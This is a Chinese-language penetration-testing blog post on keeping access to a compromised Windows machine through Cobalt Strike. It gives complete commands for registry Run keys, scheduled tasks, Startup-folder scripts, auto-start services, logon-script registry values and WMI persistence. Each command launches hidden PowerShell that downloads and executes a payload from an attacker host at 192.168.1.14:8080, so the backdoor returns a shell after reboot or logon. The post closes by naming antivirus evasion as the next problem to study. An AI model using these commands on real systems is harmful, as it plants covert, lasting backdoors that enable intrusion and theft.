---
title: Windows权限维持
date: 2021-05-23 13:15:04
categories: 渗透测试技巧
tags: 权限维持
---

#### 背景

在拿到目标系统权限之后，为了防止权限不会因系统重启或其他情况而丢失，需要建立一个持久化的据点，本文收集和整理了几种常见权限维持的技巧，目前这几种方法均会被杀软拦截，所有操作均在cs上完成。

<!--more-->

#### 权限维持

##### 注册表启动项

注册表启动项是常见的持久化方式，主要有两个路径

1. HKEY_CURRENT_USER  简写 HKCU
2. HKEY_LOCAL_MACHINE  简写 HKLM

HKCU为当前用户路径，而HKLM为机器路径

添加自启动项

需要管理员权限

```vbscript
shell reg add hklm\software\microsoft\windows\currentversion\run /v "shell" /t REG_SZ /d "c:\windows\system32\windowspowershell\v1.0\powershell.exe -nop -w hidden -c \"IEX((new-object net.webclient).downloadstring('http://192.168.1.14:8080/a'))\"" /f
```

这里采用无文件落地方式，不然可直接将**/d**参数后跟上可执行文件后门路径即可

若找不到powershell路径，可切换到根目录试试如下命令

`dir /s /b powershell.exe`

![](https://cdn.laohuan.art/2021-04-24_16-26.png)

查询刚刚添加的键值

` shell reg query hklm\software\microsoft\windows\currentversion\run`

![](https://cdn.laohuan.art/2021-04-24_16-31.png)

重启之后可上线

![](https://cdn.laohuan.art/2021-04-24_16-37.png)

##### 计划任务

计划任务在win8之前使用at命令，之后使用schtasks命令来创建或删除计划任务

此处创建的计划任务通过**/ru system**命令以管理员权限启动，所以创建此计划任务同样需要管理员权限。

```vbscript
 shell schtasks /create /tn update /tr "c:\windows\system32\windowspowershell\v1.0\powershell.exe -windowstyle hidden -Nologo -Noninteractive -ep bypass -nop -c 'IEX((new-object net.webclient).downloadstring(''http://192.168.1.14:8080/a'''))'" /sc onstart /ru system
```

**/sc**参数

1. onstart 系统启动
2. onlogon 用户登陆
3. onidle  /i 1 系统空闲,**/i**参数指定系统必须持续空闲1分钟才启动计划任务

![](https://cdn.laohuan.art/2021-04-24_17-20.png)

查看创建的计划任务

` shell schtasks /query /fo list /tn update /v `

![](https://cdn.laohuan.art/2021-04-24_20-10.png)

重启上线

![](https://cdn.laohuan.art/2021-04-24_20-03.png)

##### 启动项

放在自启动目录下的程序或快捷方式在用户登陆时都会自动启动

* 当前用户

  ` C:\Users\当前用户名\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup`

* 所有用户

  `C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp`

测试放入1.bat，实战可放入可执行恶意程序或恶意快捷方式

1.bat执行恶意powershell代码

`powershell.exe -nop -w hidden -c IEX((new-object net.webclient).downloadstring('http://192.168.1.14:8080/a'))`

##### 自启动服务

cs上可直接生成以服务运行的可执行程序，这里继续以无文件落地的方式演示实验

创建名为shell的自启动服务

`shell sc create "shell" binpath= "cmd /c start powershell.exe -nop -w hidden -c IEX((new-object net.webclient).downloadstring('http://192.168.1.14:8080/a'))"`

设置服务描述

`shell sc description "shell" "test"`

设置服务自启动

`shell sc config "shell" start= auto`

启动服务

`shell net start "shell"`

##### Logon Scripts后门

当用户登陆时触发

注册表：`HKEY_CURRENT_USER\Environment\`

创建**UserInitMprLogonScript**键值

```vbscript
shell reg add  HKCU\Environment  /v UserInitMprLogonScript /t REG_SZ  /d "c:\windows\system32\windowspowershell\v1.0\powershell.exe -nop -w hidden -c \"IEX((new-object net.webclient).downloadstring('http://192.168.1.14:8080/a'))\"" /f
```

![](https://cdn.laohuan.art/2021-04-28_21-03.png)

##### WMI

windows可通过WMI使用命令行或批处理命令来管理系统，相当于一个可与系统交互的API,windows默认安装。

网上已有利用WMI做权限维持的脚本

[**WMI-Persistence.ps1**](https://github.com/n0pe-sled/WMI-Persistence/blob/master/WMI-Persistence.ps1)

修改payload

![](https://cdn.laohuan.art/2021-04-28_21-27.png)

1.`powershell-import /home/kali/software/WMI-Persistence.ps1 `

2.`powershell Install-Persistence`

3.`powershell Check-WMI`

删除，不然会一直轮循弹shell回来

4.powershell  Remove-Persistence

![](https://cdn.laohuan.art/2021-04-28_21-38.png)

![](https://cdn.laohuan.art/2021-04-28_21-39.png)

#### 后话

目前上述所有方法都会被杀软拦截，除了对可执行程序的免杀之外，如何在杀软不会拦截的情况下实现权限维持是需要继续研究的点，上述只是一般权限维持的常见手法，还有许多思路奇特新颖的方法等着去尝试。

#### 参考链接

* [https://www.freebuf.com/articles/system/229209.html](https://www.freebuf.com/articles/system/229209.html)
* [https://xz.aliyun.com/t/8095](https://xz.aliyun.com/t/8095)

